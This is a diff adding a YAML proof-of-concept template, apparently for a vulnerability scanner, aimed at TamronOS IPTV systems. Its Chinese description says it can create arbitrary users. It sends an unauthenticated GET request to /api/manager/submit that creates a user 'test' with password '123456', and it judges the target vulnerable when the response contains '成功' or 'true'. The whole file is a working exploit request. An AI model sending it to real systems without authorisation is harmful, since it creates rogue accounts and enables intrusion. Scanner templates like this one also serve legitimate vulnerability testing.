@@ -1,0 +1,10 @@
+name: poc-yaml-TamronOS-IPTV-createuser
+description: "可创建任意用户"
+method: GET
+path:
+  - /api/manager/submit?group=1&username=test&password=123456
+expression:
+  status: 200
+  body_any:
+    - "成功"
+    - "true"
